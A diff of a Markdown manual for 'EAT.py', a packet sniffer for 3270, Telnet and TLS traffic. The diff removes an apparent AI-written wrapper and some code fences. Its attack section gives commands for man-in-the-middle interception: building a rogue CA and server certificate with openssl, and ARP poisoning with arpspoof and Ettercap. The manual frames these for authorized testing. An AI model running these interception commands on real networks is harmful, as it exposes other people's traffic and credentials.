@@ -1,5 +1,3 @@
-Below is the **Technical Manual** for `EAT.py`, converted to **Markdown**. You can copy and save it into a file named **`eat.md`**.
-
 ```markdown
 # EAT.PY - Technical Manual
 
@@ -29,9 +27,9 @@ Below is the **Technical Manual** for `EAT.py`, converted to **Markdown**. You c
 
 1. **Python 3.x**: Ensure you have a modern Python environment (3.6+ recommended).
 2. **Scapy**: This script depends on Scapy to capture, parse, and write PCAP files. Install via:
-   ```bash
+
    pip install scapy
-   ```
+
 3. **Permissions**: On many systems, sniffing requires elevated privileges (e.g., `sudo` on Linux).
 
 ### Optional Components for TLS Decryption
@@ -58,13 +56,13 @@ Below is the **Technical Manual** for `EAT.py`, converted to **Markdown**. You c
 
 ## 4. Usage Examples
 
-Below are some typical command-line examples. Adjust them as needed.
+Below are some typical command-line examples. 
 
 ### 4.1 Capturing EBCDIC (e.g., 3270 Traffic)
 
-```bash
+
 python3 EAT.py 192.168.1.10 -p 3270 --encoding ebcdic
-```
+
 
 - **Target**: `192.168.1.10`
 - **Port**: `3270`
@@ -73,9 +71,9 @@ python3 EAT.py 192.168.1.10 -p 3270 --encoding ebcdic
 
 ### 4.2 Capturing ASCII (e.g., Telnet on Port 23)
 
-```bash
+
 python3 EAT.py 192.168.1.50 -p 23 --encoding ascii
-```
+
 
 - **Target**: `192.168.1.50`
 - **Port**: `23`
@@ -84,9 +82,9 @@ python3 EAT.py 192.168.1.50 -p 23 --encoding ascii
 
 ### 4.3 Capturing TLS/SSL on Port 443
 
-```bash
+
 python3 EAT.py --tls -i eth0
-```
+
 
 - **TLS flag**: Ignores the `TARGET` and `PORT` parameters, defaulting to port **443**.
 - **Output**: Saves encrypted packets to `tls_traffic.pcap`. By default, you see ciphertext in real time.
@@ -101,22 +99,22 @@ python3 EAT.py --tls -i eth0
 If you have a **test environment** and can install your own **root CA** or certificate on the client:
 
 1. **Create a CA (once)**:
-   ```bash
+
    openssl genrsa -out myCA.key 2048
    openssl req -x509 -new -nodes -key myCA.key -sha256 -days 365 -out myCA.crt
-   ```
+
    This is your **root certificate**.
 
 2. **Trust your CA**:
    - On the client machine, import `myCA.crt` into the trusted certificate store (varies by OS).
 
 3. **Generate a Server Certificate** using your CA:
-   ```bash
+
    openssl genrsa -out mitm_server.key 2048
    openssl req -new -key mitm_server.key -out mitm_server.csr
    openssl x509 -req -in mitm_server.csr -CA myCA.crt -CAkey myCA.key \
      -CAcreateserial -out mitm_server.crt -days 365 -sha256
-   ```
+
    You now have `mitm_server.crt` and `mitm_server.key` that can be used by your MITM proxy.
 
 4. **Run a MITM proxy** (e.g., a custom Python script, or a tool like `mitmproxy`, `bettercap`, or `sslsplit`) that presents `mitm_server.crt` to the client. Once the proxy intercepts traffic, you can see plaintext in real time or forward it to **`EAT.py`** in unencrypted form.
@@ -126,19 +124,19 @@ If you have a **test environment** and can install your own **root CA** or certi
 On a local network, you can use **`arpspoof`** or **`Ettercap`** to trick the client and router into sending traffic to your machine:
 
 - **arpspoof** example:
-  ```bash
+
   # 1. Enable IP forwarding so you can forward traffic
   echo 1 > /proc/sys/net/ipv4/ip_forward
 
   # 2. Start arpspoof (client is 192.168.1.50, gateway is 192.168.1.1)
   arpspoof -i eth0 -t 192.168.1.50 192.168.1.1
   arpspoof -i eth0 -t 192.168.1.1 192.168.1.50
-  ```
+
 
 - **Ettercap** example:
-  ```bash
+
   ettercap -T -M arp:remote /192.168.1.50// /192.168.1.1//
-  ```
+
 
 ### 5.3 Viewing Plaintext from MITM
 
@@ -176,5 +174,3 @@ Once you have a successful MITM setup:
 
 By combining **`EAT.py`** with standard MITM tools like **arpspoof** and **Ettercap**, or by setting up a **trusted certificate** on the client, you can ethically demonstrate (within an authorized penetration test or lab environment) how easily plaintext credentials or data can be exposed—or how effectively TLS encryption can protect data against interception.
 ```
-
-Save the above contents into a file named **`eat.md`** to have a complete Markdown-based technical manual.
